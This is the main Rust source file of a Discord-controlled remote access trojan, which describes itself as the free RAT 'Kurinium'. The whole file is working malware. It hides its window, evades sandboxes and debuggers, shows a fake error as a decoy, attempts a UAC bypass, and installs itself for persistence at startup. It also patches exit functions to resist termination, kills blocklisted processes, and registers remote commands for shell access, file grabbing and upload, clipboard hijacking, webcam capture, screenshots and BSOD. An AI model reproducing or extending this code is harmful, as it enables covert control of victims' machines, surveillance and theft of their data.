// Hide console window in release builds
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)]

use crate::prelude::*;
use std::env;
use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};

use crate::core::decoy::show_fake_error;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;

use crate::system_info::{DeviceInfo, SystemInfo};

// Modules
mod command_registry;
mod commands;
mod config;
mod core;
mod handler;
mod installation;
mod prelude;
mod system_info;
mod uac_bypass;
mod utils;

// Re-exports for other modules
use commands::core::*;
use commands::crypto::*;
use commands::filesystem::*;
use commands::network::*;
use commands::system::*;
use commands::utility::*;

use crate::core::exit_patcher::safe_exit;

// Register all commands
async fn register_all_commands() -> anyhow::Result<()> {
    let registry = command_registry::get_registry();

    register_commands!(
        registry,

        // Core commands
        HelpCommand,
        PingCommand,
        InfoCommand,
        ShellCommand,
        LinkRunCommand,
        ExitCommand,
        AuthCommand,

        // Crypto commands
        EncryptCommand,
        DecryptCommand,

        // Filesystem commands
        CatCommand,
        CdCommand,
        CheckDriveCommand,
        ClearCommand,
        DownloadCommand,
        FileInfoCommand,
        GetCommand,
        GrabCommand,
        LsCommand,
        MkdirCommand,
        RemoveCommand,
        RenameCommand,
        SizeCommand,
        UnrarCommand,
        UnzipCommand,
        UploadCommand,
        ZipCommand,

        // System commands
        ProcessCommand,
        MonitorCommand,
        UpdateCommand,
        UninstallCommand,
        VolumeCommand,
        BlockInputCommand,
        ScreenCommand,
        CapsFlickerCommand,
        VisibleCommand,
        HostCommand,
        BsodCommand,

        // Utility commands
        ClipboardCommand,
        ClipperCommand,
        ForegroundCommand,
        JumpscareCommand,
        OpenUrlCommand,
        PrintCommand,
        ScreenshotCommand,
        WebcamCommand,
        RobloxCommand,

        // Network commands
        IpconfigCommand,
    )?;

    if Config::SHOW_CONSOLE {
        println!("Registered {} commands", registry.command_count());
    }
    Ok(())
}

fn run_saa() -> bool {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction, random_delay};

    let config = AntiAnalysisConfig {
        check_vm: false,
        check_sandbox: true,
        check_debugger: true,
        min_uptime_seconds: 300,
        min_ram_gb: 2,
        min_processes: 40,
        min_disk_gb: 50,
        delay_range: (30, 90),
        action: EvasionAction::DelayThenExit,
    };

    let result = run_checks(&config);

    if result.is_detected() {
        if Config::SHOW_CONSOLE {
            println!("Anti Analysis ----------");
            println!("  - Sandbox: {}", result.is_sandbox);
            println!("  - Debugger: {}", result.is_debugger);
            for reason in &result.reasons {
                println!("  - Reason: {}", reason);
            }
            println!("Exiting...");
        }

        random_delay(config.delay_range);
        safe_exit(0);
    }

    false
}

fn run_softaa() -> Option<Vec<String>> {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction};

    let config = AntiAnalysisConfig {
        check_vm: false,
        check_sandbox: true,
        check_debugger: true,
        min_uptime_seconds: 120,
        min_ram_gb: 2,
        min_processes: 30,
        min_disk_gb: 40,
        delay_range: (0, 0),
        action: EvasionAction::ReportOnly,
    };

    let result = run_checks(&config);

    if result.is_detected() {
        if Config::SHOW_CONSOLE {
            println!("Anti Analysis ----------");
            println!("  - Sandbox signs: {}", result.is_sandbox);
            println!("  - Debugger signs: {}", result.is_debugger);
            for reason in &result.reasons {
                println!("  - Warning: {}", reason);
            }
            println!("Continue...");
        }

        return Some(result.reasons);
    }

    None
}

fn setup_exit_protection() -> bool {
    use crate::core::exit_patcher;

    match exit_patcher::patch_exit() {
        true => {
            if Config::SHOW_CONSOLE {
                let patched = exit_patcher::get_patched_functions();
                println!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
                for func in &patched {
                    println!("  - {}", func);
                }
            }
            true
        }
        false => {
            if Config::SHOW_CONSOLE {
                println!("[ExitPatcher] Failed to patch exit functions");
            }
            false
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args: Vec<String> = env::args().collect();
    let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());

    let mut is_admin_privileged = uac_bypass::is_admin();
    singleton_prcess(is_admin_privileged);

    // ========================================================================
    #[cfg(not(debug_assertions))]
    {
        if setup_exit_protection() {
            if Config::SHOW_CONSOLE {
                println!("[ExitPatcher] Process termination protection enabled");
            }
        }
    }

    #[cfg(debug_assertions)]
    {
        if Config::SHOW_CONSOLE {
            println!("[ExitPatcher] Skipped (debug build)");
        }
    }

    // ========================================================================
    let current_exe = env::current_exe().unwrap_or_default();
    let is_installed = installation::check_if_installed(&current_exe);

    #[cfg(not(debug_assertions))]
    {
        if !is_installed {
            if Config::SHOW_CONSOLE {
                println!("[Anti-Analysis] Running checks");
            }
            run_saa();
            if Config::SHOW_CONSOLE {
                println!("[Anti-Analysis] Checks passed!");
            }
        } else {
            if Config::SHOW_CONSOLE {
                println!("[Anti-Analysis] Running checks...");
            }
            let warnings = run_softaa();
            if warnings.is_some() {
                if Config::SHOW_CONSOLE {
                    println!("[Anti-Analysis] Warnings detected but continuing...");
                }
            } else {
                if Config::SHOW_CONSOLE {
                    println!("[Anti-Analysis] Checks passed!");
                }
            }
        }
    }

    #[cfg(debug_assertions)]
    {
        if Config::SHOW_CONSOLE {
            println!("[Anti-Analysis] Skipped (debug build)");
        }
    }
    // ========================================================================

    // Show decoy message if config
    let decoy_config = Config::get_decoy_config();
    if decoy_config.enabled && !hide_decoy_flag {
        std::thread::spawn(move || {
            show_fake_error(&decoy_config);
        });
    }

    // Start keep-active thread to prevent sleep
    let keep_active_config = Config::get_keep_active_config();
    let _keep_active_thread = start_keep_active(&keep_active_config);

    //@ UAC Bypass
    if !is_admin_privileged {
        if Config::SHOW_CONSOLE {
            println!("Not running with admin privileges, attempting UAC bypass...");
        }

        if uac_bypass::attempt_uac_bypass() {
            is_admin_privileged = uac_bypass::is_admin();
            if Config::SHOW_CONSOLE {
                if is_admin_privileged {
                    println!("UAC bypass successful! Now running with admin privileges.");
                } else {
                    println!("UAC bypass failed. Continuing without admin privileges.");
                }
            }
        } else {
            if Config::SHOW_CONSOLE {
                println!("UAC bypass failed. Continuing without admin privileges.");
            }
        }
    } else {
        if Config::SHOW_CONSOLE {
            println!("Already running with admin privileges.");
        }
    }

    //@ Installation
    // Note: is_installed already checked above for anti-analysis
    if is_admin_privileged && !is_installed {
        if Config::SHOW_CONSOLE {
            println!("Starting installation process...");
        }

        match installation::install_to_path() {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation completed successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Setting up startup task...");
        }

        // Use async startup check
        match crate::core::startup::check_startup().await {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task created successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Installation complete. Exiting original process...");
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
        safe_exit(0);
    }

    //@ Hide Console
    if !Config::SHOW_CONSOLE {
        unsafe {
            let console = winapi::um::wincon::GetConsoleWindow();
            if !console.is_null() {
                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
            }
        }
    }

    //@ Initialize
    if Config::SHOW_CONSOLE {
        tracing_subscriber::fmt::init();
    }

    //@ Authentication
    let auth_config = Config::get_auth_config();
    crate::core::auth::init_auth_manager(auth_config);

    //@ Get config
    let token = Config::get_token();
    let guild_id = Config::get_guildid();

    //@ Register commands
    tokio::spawn(async move {
        match register_all_commands().await {
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Failed to register commands: {}", e);
                }
            }
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
                    println!("All commands registered in registry");
                }
            }
        }
    });

    //@ Blocklist Process Monitor
    tokio::spawn(async move {
        use sysinfo::{ProcessExt, System, SystemExt, PidExt};
        use std::collections::HashSet;
        use std::fs;
        
        fn load_blocklist() -> HashSet<String> {
            let path = installation::get_install_path().join("blocklist.json");
            if let Ok(content) = fs::read_to_string(&path) {
                content.lines()
                    .filter(|l| !l.is_empty())
                    .map(|l| {
                        let name = l.trim().to_lowercase();
                        if name.ends_with(".exe") {
                            name[..name.len()-4].to_string()
                        } else {
                            name
                        }
                    })
                    .collect()
            } else {
                HashSet::new()
            }
        }

        let mut sys = System::new_all();
        let mut killed_pids: HashSet<u32> = HashSet::new();

        loop {
            let blocklist = load_blocklist();
            
            if !blocklist.is_empty() {
                sys.refresh_processes();
                
                for (pid, process) in sys.processes() {
                    let pid_u32 = pid.as_u32();
                    
                    if killed_pids.contains(&pid_u32) {
                        continue;
                    }
                    
                    let proc_name = process.name().to_lowercase();
                    let proc_name_base = if proc_name.ends_with(".exe") {
                        &proc_name[..proc_name.len()-4]
                    } else {
                        &proc_name
                    };
                
                    if blocklist.contains(proc_name_base) {
                        if process.kill() {
                            killed_pids.insert(pid_u32);
                            if Config::SHOW_CONSOLE {
                                println!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
                            }
                        }
                    }
                }
                
                sys.refresh_processes();
                let running: HashSet<u32> = sys.processes().keys().map(|p| p.as_u32()).collect();
                killed_pids.retain(|pid| running.contains(pid));
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(300)).await;
        }
    });

    //@ Discord Connection
    let http = Arc::new(HttpClient::new(token.clone()));
    let channel_manager = crate::core::discord::channel::ChannelManager::new(
        HttpClient::new(token.clone()),
        guild_id,
    );

    let device_channel_id = channel_manager.init_dchannel().await?;
    if Config::SHOW_CONSOLE {
        println!("Device channel initialized: {}", device_channel_id);
    }

    //@ Gateway configuration
    let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;

    //@ Start WiFi monitoring
    let wifi_config = Config::get_wifi_monitor_config();
    let wifi_monitor =
        crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
    if let Err(e) = wifi_monitor.start_monitoring().await {
        if Config::SHOW_CONSOLE {
            println!("Failed to start WiFi monitoring: {}", e);
        }
    } else if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
        println!("WiFi monitoring started successfully");
    }

    if Config::SHOW_CONSOLE {
        println!("Prefix: {}", Config::BOT_PREFIX);
        println!("Guild ID: {}", guild_id);
        println!("[ Console is showing ]-----------------------------------");
    }

    //@ Event Loop With Reconnection
    let mut reconnect_delay = 5u64;
    const MIN_RECONNECT_DELAY: u64 = 5;
    const MAX_RECONNECT_DELAY: u64 = 60;

    loop {
        let mut shard = Shard::new(ShardId::new(0, 1), token.clone(), intents);

        if Config::SHOW_CONSOLE {
            println!("Connecting to Discord gateway...");
        }
        let mut connected_successfully = false;

        loop {
            let item = shard.next_event(EventTypeFlags::all()).await;

            let event = match item {
                Some(Ok(event)) => event,
                Some(Err(source)) => {
                    if Config::SHOW_CONSOLE {
                        println!("Error receiving event: {:?}", source);
                    }
                    break;
                }
                None => {
                    if Config::SHOW_CONSOLE {
                        println!("Event stream ended, reconnecting...");
                    }
                    break;
                }
            };

            match event {
                Event::Ready(_) => {
                    connected_successfully = true;
                    reconnect_delay = MIN_RECONNECT_DELAY;

                    if Config::SHOW_CONSOLE {
                        println!("Bot is ready!");
                    }
                }

                Event::Resumed => {
                    connected_successfully = true;
                    if Config::SHOW_CONSOLE {
                        println!("Gateway session resumed");
                    }
                }

                Event::MessageCreate(msg) => {
                    if let Err(e) = handler::handle_message(&http, msg.0, device_channel_id).await {
                        if Config::SHOW_CONSOLE {
                            println!("Error handling message: {}", e);
                        }
                    }
                }

                Event::InteractionCreate(interaction) => {
                    if let Err(e) = handler::handle_interaction(&http, interaction.0).await {
                        if Config::SHOW_CONSOLE {
                            println!("Error handling interaction: {}", e);
                        }
                    }
                }

                Event::GatewayClose(frame_opt) => {
                    if let Some(frame) = frame_opt {
                        if Config::SHOW_CONSOLE {
                            println!("Gateway closed with code: {}", frame.code);
                        }

                        match frame.code {
                            4004 => {
                                println!("Authentication failed: Invalid token.");
                                return Err(anyhow::anyhow!("Invalid token"));
                            }
                            4010 => {
                                println!("Invalid shard");
                                return Err(anyhow::anyhow!("Invalid shard"));
                            }
                            4011 => {
                                println!("Sharding required");
                                return Err(anyhow::anyhow!("Bot too large, needs sharding"));
                            }
                            4013 => {
                                println!("Invalid intents");
                                return Err(anyhow::anyhow!("Invalid intents"));
                            }
                            4014 => {
                                println!("Disallowed intents");
                                return Err(anyhow::anyhow!("Privileged intents not enabled"));
                            }
                            _ => {}
                        }
                    } else {
                        if Config::SHOW_CONSOLE {
                            println!("Gateway closed without close frame");
                        }
                    }

                    break; // Break to reconnect
                }

                Event::GatewayInvalidateSession(can_resume) => {
                    if Config::SHOW_CONSOLE {
                        println!("Session invalidated (resumable: {})", can_resume);
                    }
                    break;
                }

                _ => {}
            }
        }

        // Determine reconnect delay
        if !connected_successfully {
            reconnect_delay = (reconnect_delay * 2).min(MAX_RECONNECT_DELAY);

            if Config::SHOW_CONSOLE {
                println!(
                    "Failed to establish connection. Waiting {} seconds before retry...",
                    reconnect_delay
                );
            }
        } else {
            reconnect_delay = MIN_RECONNECT_DELAY;

            if Config::SHOW_CONSOLE {
                println!(
                    "Disconnected. Reconnecting in {} seconds...",
                    reconnect_delay
                );
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(reconnect_delay)).await;
    }
}